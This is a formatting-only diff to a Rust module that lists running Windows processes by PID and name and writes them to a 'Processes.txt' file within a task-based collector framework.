@@ -5,17 +5,19 @@ use collector::Collector;
 use core::ffi::CStr;
 use core::fmt::Write;
 use core::ptr::null_mut;
-use tasks::{parent_name, Task};
+use tasks::{Task, parent_name};
 use utils::path::{Path, WriteToFile};
 use windows_sys::Win32::Foundation::{CloseHandle, MAX_PATH};
 use windows_sys::Win32::System::ProcessStatus::{K32EnumProcesses, K32GetModuleBaseNameA};
-use windows_sys::Win32::System::Threading::{OpenProcess, PROCESS_QUERY_INFORMATION, PROCESS_VM_READ};
+use windows_sys::Win32::System::Threading::{
+    OpenProcess, PROCESS_QUERY_INFORMATION, PROCESS_VM_READ,
+};
 
 pub(super) struct ProcessesTask;
 
 impl<C: Collector> Task<C> for ProcessesTask {
     parent_name!("Processes.txt");
-    
+
     fn run(&self, parent: &Path, _: &C) {
         let processes = unsafe { get_process_list() };
 
@@ -28,7 +30,13 @@ impl<C: Collector> Task<C> for ProcessesTask {
         let pid_col_width = max_pid_width + 2;
 
         let mut output = String::new();
-        let _ = writeln!(&mut output, "{:<width$}{}", "PID", "NAME", width = pid_col_width);
+        let _ = writeln!(
+            &mut output,
+            "{:<width$}{}",
+            "PID",
+            "NAME",
+            width = pid_col_width
+        );
 
         for process in processes {
             let _ = writeln!(
@@ -46,7 +54,7 @@ impl<C: Collector> Task<C> for ProcessesTask {
 
 struct ProcessInfo {
     pid: u32,
-    name: String
+    name: String,
 }
 
 unsafe fn get_process_list() -> Vec<ProcessInfo> {
@@ -81,11 +89,16 @@ unsafe fn get_process_list() -> Vec<ProcessInfo> {
 
         let mut name_buf = [0u8; MAX_PATH as usize];
 
-        let len = K32GetModuleBaseNameA(handle, null_mut(), name_buf.as_mut_ptr(), name_buf.len() as u32);
+        let len = K32GetModuleBaseNameA(
+            handle,
+            null_mut(),
+            name_buf.as_mut_ptr(),
+            name_buf.len() as u32,
+        );
 
         if len > 0 {
             let name = CStr::from_ptr(name_buf.as_ptr() as *const i8);
-            
+
             if let Ok(name_str) = name.to_str() {
                 result.push(ProcessInfo {
                     pid,
